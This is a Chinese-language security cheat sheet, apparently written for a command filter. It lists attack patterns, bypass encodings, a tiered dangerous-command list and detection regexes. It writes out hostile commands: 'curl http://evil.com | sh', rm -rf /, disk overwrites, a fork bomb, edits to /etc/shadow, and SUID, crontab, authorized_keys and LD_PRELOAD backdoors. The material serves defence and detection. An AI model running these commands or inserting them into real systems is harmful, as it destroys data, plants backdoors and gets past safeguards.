# 安全检查清单 — 攻击模式速查表（完整版）

## 1. 命令注入（Command Injection）

### Shell元字符注入
```
; cmd     — 串行执行
| cmd     — 管道
& cmd     — 后台
&& cmd    — 前置成功则执行
|| cmd    — 前置失败则执行
`cmd`     — 反引号执行
$(cmd)    — 命令替换
${var}    — 变量展开
```

### 绕过变体
| 写法 | 说明 |
|------|------|
| `ls${IFS}&&` | IFS空白分隔绕过 |
| `ls%0a` | 换行符URL编码 |
| `cmd\x0a` | 十六进制换行注入 |
| `${IFS}` | 内部字段分隔符注入 |

---

## 2. 路径遍历（Path Traversal）

### 标准穿越
```
../        — 父目录
../../     — 祖父目录
../../../  — 多级
```

### 混淆变体
| 写法 | 说明 |
|------|------|
| `..;/` | 混合绕过 |
| `....//....//` | 双点重复 |
| `..%2f` | URL编码`/` |
| `..%252f` | 双重URL编码 |
| `..\` | Windows反斜杠 |
| `..%5c` | URL编码`\` |
| `%2e%2e%2f` | 全编码点斜 |
| `..//..//` | 重复斜杠混淆 |

### sed -i 特有路径绕过
```
sed -i 's/.*/hack/' /etc/passwd
sed -i 's/x/y/' ../../../etc/shadow
sed -i 's/./&/g' -- -f FILE   # --后FILE被当文件名解析
```

---

## 3. 变量注入（Variable Injection）

### 环境变量注入
```
${HOME}      — 读取环境变量
${PATH}
${LD_PRELOAD}
${LD_LIBRARY_PATH}
${IFS}        — 字段分隔符（可设为换行）
${BASH_ENV}   — bash启动文件
```

### 命令替换
```
$(whoami)
`whoami`
${内联执行}
```

### Unicode/转义绕过
| 写法 | 说明 |
|------|------|
| `$\'whoami\'` | $''转义 |
| `$\"whoami\"` | $""转义 |
| `$\n` | 换行符 |
| `$'\n'` | ANSI-C引号换行 |
| `${var:-default}` | 默认值展开 |

---

## 4. Globbing通配符（Wildcard Injection）

### Linux globbing
```
*       — 匹配任意字符
?       — 匹配单字符
[a-z]   — 字符类
[!a]    — 排除
```

### 在命令上下文中利用
```
rm *          — 删除当前目录所有文件
cat /etc/*    — 枚举目录
echo *        — 目录内容泄露
```

### Globbing+路径穿越
```
*/*/*/../*    — 嵌套通配符穿越
*/*/*/../../* — 混合穿越
```

---

## 5. 编码绕过（Encoding Bypass）

### URL编码
```
%20          — 空格
%2f          — /
%5c          — \
%0a          — 换行
%0d          — 回车
%00          — null字节截断
%250a        — 双重URL编码换行
```

### Unicode编码
```
\u0077        — Unicode
\x77         — 十六进制
\102         — 八进制
```

### Null字节截断
```
file.txt\x00.php   — 绕过扩展名检查（上传绕过常见）
```

---

## 6. 危险命令完全列表

### 严重（立即拒绝）

| 命令 | 风险 |
|------|------|
| `rm -rf /` 或 `rm -rf /*` | 递归删除根目录 |
| `dd if=/dev/zero of=/dev/sda` | 磁盘覆写 |
| `mkfs.ext4 /dev/sda` | 格式化磁盘 |
| `> /etc/passwd` | 清空系统账户文件 |
| `:(){ :\|:& };:` | Fork bomb |
| `chmod -R 777 /` | 全局权限设为777 |

### 高危（需要确认上下文）

| 命令 | 风险 |
|------|------|
| `curl http://evil.com \| sh` | 远程代码执行 |
| `wget -O- http://evil.com \| sh` | 远程代码执行 |
| `chmod +s /bin/bash` | 设置SUID后门 |
| `sudo -s` | 权限提升 |
| `passwd root` | 修改root密码 |
| `killall -9` | 强制终止所有进程 |
| `reboot`, `shutdown`, `init 0` | 系统关机/重启 |
| `mv /etc /tmp` | 移动系统目录 |
| `iptables -F` | 清除防火墙规则 |
| `ufw disable` | 关闭防火墙 |

---

## 7. NTFS攻击面

### ADS（Alternate Data Streams）

| 模式 | 说明 |
|------|------|
| `file.txt:$DATA` | 默认流 |
| `file.txt:stream_name` | 命名流 |
| `more < file.txt:stream` | 读取流 |
| `type file.txt:stream` | Windows读取流 |
| `:Zone.Identifier:$DATA` | 区域标识流 |
| `:Zone.Identifier:$DATA:<ID>` | 安全标记流 |

**识别特征**: Windows路径中出现`:`后跟非驱动器字母的组合

### 8.3短文件名（SFN）

| 短名 | 长名 |
|------|------|
| `PROGRA~1` | `Program Files` |
| `PROGRA~2` | `Program Files (x86)` |
| `DOCUME~1` | `Documents and Settings` |
| `WINDOWS~1` | `Windows` |
| `SYSVOL~1` | `sysvol` |
| `CONFIG~1` | `configuration` |
| `USERS~1` | `Users` |
| `APPLIC~1` | `Application Data` |

**识别特征**: 路径包含`~[0-9]`，纯大写+`~1`格式

### NTFS权限操作
```
icacls "C:\" /grant Everyone:F   — Windows全局权限授予
takeown /f C:\ /r                — 夺取所有权
cacls "C:\" /T /E /G Everyone:F  — 旧版权限授予
```

---

## 8. 特殊场景攻击向量

### crontab注入
```
(crontab -l; echo "0 * * * * cmd") | crontab -
```

### SSH authorized_keys注入
```
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

### SSH known_hosts投毒
```
ssh-keyscan -H target >> ~/.ssh/known_hosts
```

### LD_PRELOAD后门
```
export LD_PRELOAD=/tmp/evil.so
```

### SSH Agent劫持
```
SSH_AUTH_SOCK=/tmp/agent_xxx
```

---

## 9. 快速检测正则表达式汇总

```regex
# 命令注入
[;&|`$()]|&&|\|\|

# 路径遍历
\.\./

# 变量注入
\$\{?[a-zA-Z_]

# 编码
%[0-9a-fA-F]{2}

# 敏感路径
/etc/shadow|/etc/passwd|/root|\.ssh

# NTFS ADS
:[^/\\:*?"<>|$]+\$

# NTFS 8.3
~[0-9]|PROGRA~[0-9]

# 危险命令（需词边界）
\brm\s+-rf\s+[/"]|\bdd\s+if=|\bmkfs|\bfork\s*bomb|:(){|:|:\&
```
